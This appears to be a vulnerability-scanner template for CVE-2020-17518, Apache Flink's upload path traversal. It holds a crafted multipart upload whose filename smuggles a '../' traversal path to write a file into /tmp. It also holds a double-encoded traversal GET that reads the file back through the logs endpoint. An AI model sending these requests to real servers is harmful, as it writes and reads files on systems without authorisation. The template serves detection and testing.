id: cve-2020-17518
info:
  author: pdteam
  description: 'Apache Flink 1.5.1 introduced a REST handler that allows you to write
    an uploaded file to an arbitrary location on the local file system,

    through a maliciously modified HTTP HEADER.

    '
  name: Apache Flink Upload Path Traversal
  reference: https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518
  severity: critical
  tags: cve,cve2020,apache,lfi
requests:
- raw:
  - 'POST /jars/upload HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Accept-Language: en

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y

    Content-Length: 187


    ------WebKitFormBoundaryoZ8meKnrrso89R6Y

    Content-Disposition: form-data; name="jarfile"; filename="../../../../../../../tmp/poc"


    test-poc

    ------WebKitFormBoundaryoZ8meKnrrso89R6Y--

    '
- matchers:
  - dsl:
    - contains(body, "test-poc") && status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc'
